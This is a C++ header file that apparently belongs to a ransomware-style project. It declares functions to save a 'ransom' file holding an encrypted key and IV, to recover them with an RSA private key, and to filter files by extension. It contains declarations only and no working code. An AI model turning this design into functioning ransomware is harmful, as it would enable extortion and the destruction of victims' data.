#ifndef __UTILS__H__
#define __UTILS__H__

#include <filesystem>
#include <string>
#include "cryptopp/rsa.h"

namespace fs = std::filesystem;

void saveRamsonFile(const std::string& encKeyIV);

void recoverKeyIV(CryptoPP::RSA::PrivateKey& privateKey,
                  const std::string& encKeyIV,
                  std::string& recoveredKey,
                  std::string& recoveredIV);

bool checkExtension(const fs::directory_entry &dir);

#endif